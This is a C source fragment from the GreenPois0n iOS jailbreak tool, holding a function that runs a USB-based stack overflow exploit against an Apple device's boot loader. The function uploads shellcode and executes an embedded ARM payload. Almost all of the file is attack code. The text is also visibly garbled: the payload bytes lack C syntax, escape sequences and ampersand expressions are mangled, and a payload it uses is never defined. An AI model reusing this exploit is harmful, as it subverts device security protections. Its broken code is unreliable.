/**
 * GreenPois0n Syringe - libpois0n.c
 * Copyright (C) 2010 Chronic-Dev Team
 * Copyright (C) 2010 Joshua Hill
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

int PUG_exploit() {
irecv_error_t error = IRECV_E_SUCCESS;
int i, ret;
unsigned char data[0x800];
unsigned char payload[] = {
08 E0 C0 46 C0 46 C0 46 C0 46 C0 46 C0 46 C0 46 C0 46 C0 46 08 48 00 21 08 4A 00 F0 05 F8 06 48 07 49 00 22 07 4B 98 47 0B 78 03 70 01 30 01 31 01 3A 00 2A F8 D1 70 47 00 00 00 84 00 00 01 00 00 40 02 00 EF 07 00 00
};

info("Executing PUG exploit ...n");
debug("Reseting usb counters.n");
ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
if (ret < 0) {
error("Failed to reset usb counters.n");
return -1;
}

debug("executing stack overflown");
unsigned int stack_address = 0x84033F98;
for(i = 0; i < 0x23800 ; i+=0x800) {
ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
if (ret < 0) {
error("Failed to push data to the device.n");
return -1;
}
}
debug("Uploading shellcode.n");
memset(data, 0, 0x800);
memcpy(data, SHAtter_payload, sizeof(SHAtter_payload));
ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
if (ret < 0) {
error("Failed to upload shellcode.n");
return -1;
}

debug("Reseting usb counters.n");
ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
if (ret < 0) {
error("Failed to reset usb counters.n");
return -1;
}

int send_size = 0x100 + sizeof(payload);
*((unsigned int*) &payload;[0x14]) = send_size;
memset(data, 0, 0x800);
memcpy(&data;[0x100], payload, sizeof(payload));

ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size , 1000);
if (ret < 0) {
error("Failed to send PUG to the device.n");
return -1;
}
ret = irecv_control_transfer(client, 0xA1, 1, 0, 0, data, send_size , 1000);
if (ret < 0) {
error("Failed to execute PUG.n");
return -1;
}
info("PUG sent & executed successfully.n");

debug("Reconnecting to devicen");
client = irecv_reconnect(client, 2);
if (client == NULL) {
debug("%sn", irecv_strerror(error));
error("Unable to reconnectn");
return -1;
}

return 0;
}
 

